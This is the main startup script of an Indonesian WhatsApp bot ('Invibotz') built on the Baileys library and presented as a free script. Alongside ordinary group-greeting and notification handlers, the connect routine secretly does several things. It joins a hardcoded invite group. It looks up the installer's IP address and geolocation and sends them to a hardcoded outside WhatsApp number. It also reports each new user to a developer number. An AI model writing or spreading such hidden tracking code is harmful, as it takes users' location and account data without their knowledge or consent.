/// GOSAH SOK RECODE NJIM
// BY WANN AR


const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const wann = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor, WannLog } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, info, close } = require('./lib/yntkts')
const { banner, start, success }  = require('./lib/functionss')
const { waiting } = require('./lib/waiting')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
baterai = 'unknown'
NamaOwner = '©Wann'
NamaBot = 'Invibotz'
NomorOwner = '6285640068416'
target = "6285640068416@s.whatsapp.net"
spc1 = '         '

spc2 = '\n                           '

spc3 = '                   '

spc4 = '               '



charging = 'unknown'
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
require('./invibot.js')
nocache('./invibot.js', module => console.log(`${module} is now updated!`))
//button nya

const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync(`./media/image/me.jpg`), surface: 200, message: `)-----[XM BOT]-----(`, orderTitle: 'wann.ratama', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
       
const starts = async (wann = new WAConnection()) => {
   console.log(color('Selamat Datang Di Invibot Menu\n - WANN OFC : DEVELOPER ', 'red'), color('\nScript Ini Gratis Buat Kalian\n\n THANKS TO \n - ZEEONE OFC \n - FARDAN OFC', 'green'))
wann.logger.level = 'warn'
    wann.version = [2, 2143, 3]
    wann.browserDescription = [ 'Invibotz', 'Aloha', '5.4' ] 
console.log(banner.string);
  wann.on("qr", () => {
    console.log(
      color("[", "white"),
      color("!", "blue"),
      color("]", "white"),
      color(" Scan bang"),
    );
  })

console.log(color(`${spc2}[ • CREATOR BOT WANN OFFICIAL• ]` ,'cyan'))

console.log(color(`${spc4}< =========================[ INVIBOTZ ]==================== >`, 'cyan'))

console.log(color(`${spc3}[•]`, 'aqua'), color(`Hai        : Pengguna InviBotz`, 'red'))

console.log(color(`${spc3}[•]`, 'aqua'), color(`Bot Version : 1.1.0`, 'red'))

console.log(color(`${spc3}[•]`, 'aqua'), color(`Status      : Online!`, 'white'))

console.log(color(`${spc3}[•]`, 'aqua'), color(`Depelover  : WannBotz`, 'white'))

console.log(color(`${spc4}< ===========================[ Succes ]======================= >`, 'cyan'))

    console.log(color('⎇','red'), color('𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗚𝘄 𝗦𝘂𝘀𝘂𝗻 𝗦𝗲𝗻𝗱𝗶𝗿𝗶!\n𝗡𝗼𝘁𝗲: 𝗝𝗮𝗻𝗴𝗮𝗻 𝗟𝘂𝗽𝗮 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲 Wann Botz シ︎', 'aqua'))
    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'))
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/6285640068416'))
    console.log(color('[INVI-BOT]'), color('𝗦𝗲𝗹𝗳𝗯𝗼𝘁 Wann Botz 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
    console.log(color('[WANN]', 'cyan'), color('𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗕𝗮𝗰𝗸, 𝗢𝘄𝗻𝗲𝗿! 𝗛𝗼𝗽𝗲 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗗𝗼𝗶𝗻𝗴 𝗪𝗲𝗹𝗹~', 'aqua'))

    console.log(color('⎇','green'), color('𝗠𝗮𝗸𝗮𝘀𝗶𝗵 𝗗𝗵 𝗣𝗮𝗸𝗲', 'aqua'))
console.log(color('|WRN|', 'yellow'), color('Confirm To Developer InviBotz', 'cyan'))


 // Menunggu QR Muncul
    
    wann.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan bang'))
    })
await wann.connect({ timeoutMs: 30 * 1000 });
  teks = `https://chat.whatsapp.com/HDksicmvqow2GEfT2pyyJB`
 wann.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
 wann.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(wann.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Invi bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./wann.jpg'),sourceUrl:"https://wa.me/6285640068416?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       wann.sendMessage("6285640078416@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./wann.jpg'),sourceUrl:"https://wa.me/6285640068416?text=Assalamualaikum"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
})
    fs.existsSync('./session.json') && wann.loadAuthInfo('./session.json')
    wann.on('connecting', () => {
        start('2', 'Connecting...')
    })
    wann.sendMessage(`${target}`, "\`\`\`[ ! ] PENGGUNA BARU DETECT [ ! ]\`\`\`\n\n\`\`\`Hai Kak Salam Pengguna Invibot V2.1 \`\`\`", MessageType.text)
    wann.on('open', () => {
        success('2', 'Connected')
        setTimeout( () => { 	
	    	}, 1000)    		    	     	
    })
    await wann.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./session.json', JSON.stringify(wann.base64EncodedAuthInfo(), null, '\t'))
    wann.on('ws-close', () => {
        console.log(WannLog('Koneksi terputus, mencoba menghubungkan kembali..'))
    })

    // Mengkoneksi ulang
    wann.on('close', async ({ reason, isReconnecting }) => {
        console.log(WannLog('Terputus, Alasan :' + reason + '\nMencoba mengkoneksi ulang :' + isReconnecting))
        if (!isReconnecting) {
            console.log(WannLog('Connect To Phone Rejected and Shutting Down.'))
        }
    })
	// Baterai

	wann.on('CB:action,,battery', json => {

		global.batteryLevelStr = json[2][0][1].value

		global.batterylevel = parseInt(batteryLevelStr)

		baterai = batterylevel

		if (json[2][0][1].live == 'true') charging = true

		if (json[2][0][1].live == 'false') charging = false

		console.log(json[2][0][1])

		console.log('Baterai : ' + batterylevel + '%')

	})

	global.batrei = global.batrei ? global.batrei : []

	wann.on('CB:action,,battery', json => {

		const batteryLevelStr = json[2][0][1].value

		const batterylevel = parseInt(batteryLevelStr)

		global.batrei.push(batterylevel)

	})  

    wann.on('chat-update', async (message) => {
        require('./invibot.js')(wann, message)
        ownerNumber = ["6285640068416@s.whatsapp.net","6285640068416@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6285640068416@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })
        waiting('2', 'Menunggu pesan baru...')
        wann.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			const mdata = await wann.groupMetadata(anu.jid)
		    try {
			console.log(anu)
			if (anu.action == 'add') {
			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
        	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;wann.;;\nFN:wann\nitem1.TEL;waid=6287708357324:6287708357324\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
		    num = anu.participants[0]
			try {
			ppimg = await wann.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			masuk =`Halo @${num.split('@')[0]}\nSelamat Datang Di ${mdata.subject}\n\n*Jangan Lupa Isi*\n*Nama* :\n*Umur* :\n*Gender* :\n*Askot* :\n\nEnjoy Jangan Lupa Kenalan\n\nDan baca juga Rules Group❗`
			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Welcome'},type:1}]
			mhan = await wann.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
const buttonMessages = { imageMessage: mhan.message.imageMessage,
contentText: `${masuk}`,
footerText: `Welcome  Information`, 
buttons: gbutsan,
headerType: 4 }
			wann.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {thumbnail: fs.readFileSync('./media/image/me.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
			} else if (anu.action == 'remove') {
			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
        	if(!welkom.includes(mdata.id)) return
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;wann;;\nFN:WANN\nitem1.TEL;waid=6285640068416:6285640068416\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
			num = anu.participants[0]
			try {
			ppimg = await wann.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			let buff = await getBuffer(ppimg)
			keluar =`Selamat tinggal @${num.split('@')[0]}\nSemoga tenang disana`
			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Byee'},type:1}]
			mhan = await wann.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
const buttonMessages = { imageMessage: mhan.message.imageMessage,
contentText: `${keluar}`,
footerText: `Leave Information`,
buttons: gbutsan,
headerType: 4 }
			wann.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, { thumbnail: fs.readFileSync('./media/image/me.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
			} else if (anu.action == 'promote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;wann;;\nFN:wannn\nitem1.TEL;waid=6285640068416:6285640068416\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
shp = '◦➛'
var thu = await wann.getStatus(anu.participants[0], MessageType.text)
num = anu.participants[0]
teks = `*P R O M O T E - D E T E C T E D*\n\n${shp} Username: @${num.split('@')[0]}\n\n${shp} Bio : ${thu.status}\n\n${shp} Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n\n${shp} Group: ${mdata.subject}\n\nDon't break the rules!`
wann.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
} 
else if (anu.action == 'demote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;wann.;;\nFN:wann\nitem1.TEL;waid=6285640068416:6285640068416\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
shp = '◦➛'
thu = await wann.getStatus(anu.participants[0], MessageType.text)
num = anu.participants[0]
teks = `*D E M O T E - D E T E C T E D*\n\n${shp} Username: @${num.split('@')[0]}\n\n${shp} Bio : ${thu.status}\n\n${shp} Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n\n${shp} Group: ${mdata.subject}`
wann.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       

	wann.on('group-update', async (anu) => {
		const metdata = await wann.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;wann.;;\nFN:wann.nitem1.TEL;waid=6287708357324:6287708357324\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
    wann.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|INFO|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.announce == 'true'){
    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
    wann.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|INFO|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
    wann.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('|INFO|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
    wann.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|INFO|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
    wann.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|INFO|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
  }
})

wann.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
        wann.sendMessage(`${target}`, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
        await sleep(5000)
        await wann.blockUser(callerId, "add")
        ban.push(`${callerId}`)
        fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
        })
}

console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('https://github.com/X-Invibotz', 'cyan'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
	}
}


function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}

function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()